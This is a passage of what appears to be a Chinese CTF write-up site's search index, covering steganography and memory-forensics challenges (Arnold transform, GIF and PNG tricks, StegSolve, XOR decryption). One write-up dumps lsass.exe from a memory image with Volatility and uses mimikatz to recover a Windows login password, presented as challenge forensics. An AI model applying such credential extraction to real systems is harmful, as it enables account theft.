\u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0\n \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0   \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0   \u25a0 \u25a0 \u25a0   \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0   \u25a0 \u25a0 \u25a0   \u25a0 \u25a0   \u25a0 \u25a0 \u25a0   \u25a0 \u25a0   \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0\n \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0   \u25a0 \u25a0 \u25a0         \u25a0 \u25a0 \u25a0   \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0   \u25a0 \u25a0 \u25a0         \u25a0 \u25a0 \u25a0         \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0\n \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0   \u25a0 \u25a0 \u25a0   \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0   \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0   \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0   \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0   \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0\n \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0   \u25a0 \u25a0 \u25a0         \u25a0 \u25a0 \u25a0   \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0   \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0   \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0   \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0\n \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0\n \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0\n \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0\n \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0  \n\nProcess finished with exit code 0\n</code></pre> <p>\u9898\u76ee\u540d\u6709\u63d0\u793a\u732b\uff0c\u6700\u540e\u5e94\u8be5\u662f Arnold \u53d8\u6362</p> <pre><code>from PIL import Image\n\nimg = Image.open('flag.png')\nif img.mode == \"P\":\n    img = img.convert(\"RGB\")\nassert img.size[0] == img.size[1]\ndim = width, height = img.size\n\nst = 33\na = 121\nb = 144\nfor _ in range(st):\n    with Image.new(img.mode, dim) as canvas:\n        for nx in range(img.size[0]):\n            for ny in range(img.size[0]):\n                y = (ny - nx * a) % width\n                x = (nx - y * b) % height\n                canvas.putpixel((y, x), img.getpixel((ny, nx)))\ncanvas.show()\ncanvas.save('result.png')\n</code></pre> <p></p>"},{"location":"Misc/Chapter2/2-46/","title":"GIF \u5bbd\u9ad8\u9690\u5199","text":""},{"location":"Misc/Chapter2/2-46/#gif-\u5bbd\u9ad8\u9690\u5199","title":"GIF \u5bbd\u9ad8\u9690\u5199","text":"<p>\u5148\u786e\u5b9a\u955c\u50cf\u7cfb\u7edf</p> <pre><code>python2 vol.py -f '/home/kali/\u5185\u5b58\u53d6\u8bc1.raw' imageinfo\n</code></pre> <p></p> <p>\u5148\u770b\u8fdb\u7a0b\u53d1\u73b0\u6700\u5f00\u59cb\u8c03\u7528\u4e86\u6d4f\u89c8\u5668</p> <pre><code>python2 vol.py -f '/home/kali/\u5185\u5b58\u53d6\u8bc1.raw' --profile=Win7SP1x64 pstree\n</code></pre> <p></p> <p>\u76f4\u63a5\u67e5\u770b\u6d4f\u89c8\u5668\u8bb0\u5f55</p> <pre><code>python2 vol.py -f '/home/kali/\u5185\u5b58\u53d6\u8bc1.raw' --profile=Win7SP1x64 iehistory\n</code></pre> <p></p> <p>\u6253\u5f00\u4e09\u6761\u94fe\u63a5</p> <p></p> <p>\u53ef\u4ee5\u770b\u5230\u8fd8\u6709\u4e00\u4e2a key.png \u6587\u4ef6\uff0c\u53bb\u641c\u7d22\u4e00\u4e0b</p> <p></p> <p>dump \u51fa\u6765</p> <pre><code>python2 vol.py -f '/home/kali/\u5185\u5b58\u53d6\u8bc1.raw' --profile=Win7SP1x64 dumpfiles -Q 0x000000003e5e94c0 -D ../\n</code></pre> <p>key.png \u662f\u6587\u672c\u6587\u4ef6\uff0c\u5185\u5bb9\u4e3a\uff1a</p> <pre><code>\u6211\u8bb0\u5f97\u6211\u5b58\u4e86\u4e00\u4e2a\u975e\u5e38\u68d2\u7684\u89c6\u9891\uff0c\u4f46\u600e\u4e48\u627e\u4e0d\u5230\u4e86\uff0c\u4f1a\u4e0d\u4f1a\u5728\u9ed8\u8ba4\u6587\u4ef6\u5939\u4e0b\n</code></pre> <p>\u89c6\u9891\u7684\u9ed8\u8ba4\u6587\u4ef6\u5939\u662f Video\uff0c\u5c1d\u8bd5\u641c\u7d22\u4e00\u4e0b Video</p> <p></p> <p>dump \u51fa\u6765</p> <p></p> <p>\u524d\u9762\u8fdb\u7a0b\u8fd8\u6709\u7ed9 <code>cmd.exe</code>\uff0c\u53bb\u770b\u770b\u6267\u884c\u4e86\u4ec0\u4e48</p> <pre><code>python2 vol.py -f '/home/kali/\u5185\u5b58\u53d6\u8bc1.raw' --profile=Win7SP1x64 cmdscan\n</code></pre> <p></p> <p>\u4e4b\u524d IE \u641c\u7d22\u8bb0\u5f55\u91cc\u6709\u6587\u4ef6\u540d\u52a0\u524d\u7f00\u7684\u63d0\u793a\uff0c\u6000\u7591\u5c31\u662f\u52a0\u4e86 5201314\uff0c\u6545 filescan \u4e00\u4e0b 5201314\uff0c\u5f97\u5230\u4e00\u4e2a tips</p> <p></p> <p>dumpfiles \u51fa\u6765\uff0c\u662f\u4e00\u4e2a\u52a0\u5bc6\u538b\u7f29\u5305\uff0cohhhh \u6587\u4ef6\u5185\u7684 Key \u4e5f\u4e0d\u662f\u5bc6\u7801</p> <p></p> <p>\u8fd8\u53ef\u80fd\u5b58\u5728 Key \u7684\u5730\u65b9\uff0c\u4e5f\u8bb8\u4f1a\u662f\u7ba1\u7406\u5458\u767b\u5f55\u5bc6\u7801\uff0c\u5c1d\u8bd5 mimikatz \u4e00\u4e0b</p> <p>\u56e0\u4e3a\u662f raw \u6587\u4ef6\uff08\u5b8c\u6574\u7684 Windows \u5185\u5b58\u955c\u50cf\uff09\u6240\u4ee5\u4e0d\u80fd\u76f4\u63a5\u6293\u53d6\uff0c\u5f97\u5148\u5355\u72ec dump \u51fa <code>lsass.exe</code> \u8fdb\u7a0b</p> <pre><code>python2 vol.py -f '/home/kali/\u5185\u5b58\u53d6\u8bc1.raw' --profile=Win7SP1x64 memdump -p 500 -D ../\n</code></pre> <p></p> <p>\u6293\u53d6\u5230\u5bc6\u7801\u662f <code>MahouShoujoYyds</code></p> <p>\u89e3\u5bc6\u538b\u7f29\u5305\u6210\u529f\uff0c\u538b\u7f29\u5305\u5185\u662f\u4e2a Python \u6587\u4ef6</p> <pre><code>import struct\nkey = 'xxxxxxxxx'\nfp = open('!@#$importance', 'rb')\nfs = open('!@#$unimportance', 'wb')\ndata = fp.read()\nfor i in range(0, len(data)):\n    result = struct.pack('B', data[i] ^ ord(*key[i % len(key)]))\n    fs.write(result)\nfp.close()\nfs.close()\n</code></pre> <p>\u6b63\u597d\u5c31\u662f\u521a\u5f00\u59cb\u7684 !@#$unimportance \u6587\u4ef6\u7684\u52a0\u5bc6\u65b9\u5f0f\uff0c\u7f3a\u5c11\u4e00\u4e2a key\uff0c\u6709 key \u5373\u53ef\u590d\u539f\u3002</p> <p>\u6839\u636e key \u7684\u4f4d\u6570\u4e3a 9 \u4f4d\uff0c\u6b63\u597d\u5c31\u662f ohhh \u6587\u4ef6\u5185\u7684 xzkbyyds!</p> <p>\u5199\u4e00\u4e2a\u9006\u811a\u672c\u89e3\u5bc6\u4e00\u4e0b\uff0c\u5f97\u5230\u4e00\u4e2a\u5934\u6587\u4ef6\u4e3a GIF89a \u7684\u6587\u4ef6\uff0c\u53ef\u77e5\u662f GIF \u56fe\u7247</p> <pre><code>import struct\nkey = 'xzkbyyds!'\nfp = open('!@#$importance', 'wb')\nfs = open('!@#$unimportance', 'rb')\ndata = fs.read()\nfor i in range(0, len(data)):\n    result = struct.pack('B', data[i] ^ ord(*key[i % len(key)]))\n    fp.write(result)\nfp.close()\nfs.close()\n</code></pre> <p>\u4fee\u6539 GIF \u9ad8\u5ea6\uff0c\u5176\u4e2d 6 7 \u5b57\u8282\u4e3a\u5bbd\uff0c 8 9 \u5b57\u8282\u4e3a\u9ad8</p> <p></p> <p>\u5728\u7b2c 115 \u5e27\u53d1\u73b0 flag</p> <p></p>"},{"location":"Misc/Chapter2/2-47/","title":"\u56fe\u50cf\u5408\u6210\u9690\u5199","text":""},{"location":"Misc/Chapter2/2-47/#\u56fe\u50cf\u5408\u6210\u9690\u5199","title":"\u56fe\u50cf\u5408\u6210\u9690\u5199","text":"<p>\u89e3\u538b\u7f29\u6587\u4ef6\u662f\u4e24\u4e2a\u4e00\u6a21\u4e00\u6837\u7684\u56fe\u7247</p> <p></p> <p>\u4f7f\u7528 StegSolve \u6253\u5f00\u9009\u62e9 Image Combiner \u6a21\u5f0f\uff08\u56fe\u50cf\u5408\u6210\uff09</p> <p></p> <p>\u53d1\u73b0\u53ef\u7591\u5185\u5bb9</p> <p></p> <p>\u4fdd\u5b58\u540e\u518d\u6253\u5f00\u5207\u6362\u901a\u9053\u53d1\u73b0\u662f\u4e8c\u7ef4\u7801</p> <p></p> <p>\u626b\u7801\u62ff\u5230 flag</p> <p></p>"},{"location":"Misc/Chapter2/2-5/","title":"\u952e\u76d8 WASD \u7ed8\u56fe","text":""},{"location":"Misc/Chapter2/2-5/#\u952e\u76d8-wasd-\u7ed8\u56fe","title":"\u952e\u76d8 WASD \u7ed8\u56fe","text":"<p>\u8fd9\u7c7b\u9898\u4e00\u822c\u90fd\u662f\u4e00\u4e32 wasd \u7684\u5b57\u7b26\u4e32</p> <p>\u5728\u6e38\u620f\u4e2d\u952e\u76d8\u7684 wasd \u5e38\u63a7\u5236\u4e0a\u4e0b\u5de6\u53f3 </p> <p>\u4e00\u6bb5\u5305\u542b wasd \u7684\u5b57\u7b26\u4e32</p> <p></p> <p>\u4f7f\u7528 Python \u7f16\u5199\u811a\u672c\u7ed8\u56fe</p> <pre><code>import matplotlib.pyplot as plt\n\n\ndef main():\n    with open(\"dewas.txt\", \"r+\") as file:\n        content = file.read()\n\n    contentListX = []\n\n    contentListY = []\n\n    x = 0\n\n    y = 0\n\n    for c in content:\n        # \u5982\u679c\u5b57\u7b26\u662f a\uff0c\u5219 x \u5750\u6807\u51cf 1\uff0c\u76f8\u5f53\u4e8e\u5728\u6c34\u5e73\u65b9\u5411\u5411\u5de6\u79fb\u52a8\n        if c == \"a\":\n            x = x - 1\n\n        # \u5982\u679c\u5b57\u7b26\u662f d\uff0c\u5219 x \u5750\u6807\u52a0 1\uff0c\u76f8\u5f53\u4e8e\u5728\u6c34\u5e73\u65b9\u5411\u5411\u53f3\u79fb\u52a8\n        elif c == \"d\":\n            x = x + 1\n\n        # \u5982\u679c\u5b57\u7b26\u662f w\uff0c\u5219 y \u5750\u6807\u52a0 1\uff0c\u76f8\u5f53\u4e8e\u5728\u5782\u76f4\u65b9\u5411\u5411\u4e0a\u79fb\u52a8\n        elif c == \"w\":\n            y = y + 1\n\n        # \u5982\u679c\u5b57\u7b26\u662f s\uff0c\u5219 y \u5750\u6807\u51cf 1\uff0c\u76f8\u5f53\u4e8e\u5728\u5782\u76f4\u65b9\u5411\u5411\u4e0b\u79fb\u52a8\n        elif c == \"s\":\n            y = y - 1\n\n        else:\n            continue\n\n        # \u5c06\u5f53\u524d\u7684 x \u548c y \u5750\u6807\u6dfb\u52a0\u5230\u5bf9\u5e94\u7684\u5217\u8868\u4e2d\n        contentListX.append(x)\n\n        contentListY.append(y)\n\n    plt.plot(contentListX, contentListY)\n\n    plt.show()\n\n\nif __name__ == '__main__':\n    main()\n</code></pre> <p>\u56fe\u5c31\u662f flag\uff0c\u4f46\u662f\u597d\u62bd\u8c61\uff08\u4e0d\u80fd\u641e\u597d\u770b\u70b9\u5417\uff09</p> <p></p>"},{"location":"Misc/Chapter2/2-6/","title":"StegSolve \u9690\u5199","text":""},{"location":"Misc/Chapter2/2-6/#stegsolve-\u9690\u5199","title":"StegSolve \u9690\u5199","text":"<p>\u653e\u5165 Stegsolve \u4e2d\u5c1d\u8bd5\u5404\u79cd\u7ec4\u5408\u627e\u5230\u4e86\u9690\u5199\u7684\u538b\u7f29\u5305</p> <p></p>"},{"location":"Misc/Chapter2/2-7/","title":"\u901a\u9053\u9690\u5199","text":""},{"location":"Misc/Chapter2/2-7/#\u901a\u9053\u9690\u5199","title":"\u901a\u9053\u9690\u5199","text":"<p>\u901a\u9053\u9690\u5199\u662f\u4e00\u79cd\u5728\u56fe\u50cf\u5904\u7406\u4e2d\u9690\u85cf\u4fe1\u606f\u7684\u6280\u672f</p> <p>\u5b83\u901a\u8fc7\u4fee\u6539\u56fe\u50cf\u7684\u989c\u8272\u901a\u9053\u6765\u5b9e\u73b0\u4fe1\u606f\u7684\u9690\u85cf </p> <p>\u6253\u5f00\u56fe\u7247\u662f\u7a7a\u767d</p> <p></p> <p>\u5728 StegSolve \u4e2d\u5207\u6362\u901a\u9053\u62ff\u5230 flag</p> <p></p>"},{"location":"Misc/Chapter2/2-8/","title":"GIF \u5e27\u9690\u5199","text":""},{"location":"Misc/Chapter2/2-8/#gif-\u5e27\u9690\u5199","title":"GIF \u5e27\u9690\u5199","text":"<p>\u539f\u7406\u5c31\u662f\u5206\u522b\u5728 GIF \u7684\u6bcf\u4e00\u5e27\u4e2d\u5199\u5165\u5185\u5bb9 </p> <p>\u62ff\u5230\u56fe\u7247\u7684\u6b65\u9aa4\u5728 RAR \u6587\u4ef6\u5934\u4fee\u590d\u90a3\u4e00\u8282\uff0c\u53ef\u4ee5\u770b\u5230\u56fe\u7247\u5185\u5bb9\u662f\u7a7a\u767d</p> <p></p> <p>\u653e\u5165 WinHex \u4e2d\u53d1\u73b0\u539f\u6765\u88ab\u4fee\u6539\u4e86\u540e\u7f00\u540d\uff0c\u5c06\u5176\u6539\u4e3a GIF</p> <p></p> <p>\u6253\u5f00\u540e\u8fd8\u662f\u7a7a\u767d\uff0c\u68c0\u67e5\u8fc7\u5341\u516d\u8fdb\u5236\u6ca1\u6709\u53d1\u73b0\u95ee\u9898</p> <p>\u7f51\u4e0a\u5728\u7ebf\u5de5\u5177\u5206\u79bb\u6bcf\u4e00\u5e27</p> <p></p> <p>\u5728 StegSolve \u4e2d\u6362\u901a\u9053\u62ff\u5230\u4e8c\u7ef4\u7801</p> <p>\u6700\u540e\u8865\u5168\u4e8c\u7ef4\u7801\u5373\u53ef\u62ff\u5230 flag</p> <p></p>"},{"location":"Misc/Chapter2/2-9/","title":"\u56fe\u7247\u62fc\u63a5\u9690\u5199\uff08\u5341\u516d\u8fdb\u5236\uff09","text":""},{"location":"Misc/Chapter2/2-9/#\u56fe\u7247\u62fc\u63a5\u9690\u5199\u5341\u516d\u8fdb\u5236","title":"\u56fe\u7247\u62fc\u63a5\u9690\u5199\uff08\u5341\u516d\u8fdb\u5236\uff09","text":"<p>\u63a5 USB \u6d41\u91cf\u9690\u5199\u90a3\u4e00\u8282\uff0c\u6211\u4eec\u5206\u79bb\u51fa\u7684\u56fe\u7247\u660e\u663e\u5c11\u4e86\u4e00\u534a</p> <p>\u4f46\u522b\u5fd8\u4e86\u8fd8\u6709\u4e00\u4e2a\u5305\u6211\u4eec\u6ca1\u7528\u5230\uff0c\u6253\u5f00\u53d1\u73b0\u7ed3\u5c3e\u662f PNG \u7ed3\u5c3e IEND</p> <p></p> <p>\u90a3\u8fd9\u5e94\u8be5\u5c31\u662f\u56fe\u7247\u7684\u4e0b\u534a\u90e8\u5206\uff0c\u5c06\u5176\u5341\u516d\u8fdb\u5236\u62fc\u63a5\u5728\u540e\u9762</p> <p></p> <p>\u6210\u529f\u6253\u5f00\u62ff\u5230 flag</p> <p></p>"},{"location":"Misc/Chapter3/","title":"Index","text":""},{"location":"Misc/Chapter3/#adrian-lamo","title":"Adrian 